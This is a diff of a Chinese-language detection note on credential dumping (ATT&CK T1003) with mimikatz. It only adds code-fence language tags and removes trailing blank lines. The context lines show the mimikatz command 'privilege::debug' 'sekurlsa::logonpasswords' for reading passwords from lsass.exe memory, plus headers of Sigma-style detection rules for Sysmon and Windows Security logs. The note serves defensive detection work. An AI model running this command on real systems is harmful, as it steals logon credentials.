@@ -33,7 +33,7 @@ windows security日志
 
 ### 攻击方法：从lsass.exe程序内存中读取密码(administrator)
 
-```
+```dos
 C:\mimikatz_trunk\x64>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
 
 mimikatz(commandline) # privilege::debug
@@ -79,7 +79,7 @@ SID               : S-1-5-21-4083414316-2806399370-2225847366-1000
 
 ### sysmon日志
 
-```
+```yml
 title: T1003-win-基于LSA-mimikatz凭证获取
 description: win7 模拟测试结果
 status: experimental
@@ -99,7 +99,7 @@ level: high
 
 ### windows security日志
 
-```
+```yml
 title: T1003-win-基于LSA-mimikatz凭证获取
 description: win7 模拟测试结果
 status: experimental
@@ -132,6 +132,3 @@ powershell：https://raw.githubusercontent.com/EmpireProject/Empire/master/data/
 mimikatz wiki：https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump
 
 关于更多转储明文密码你可以参考：https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/
-
-
-
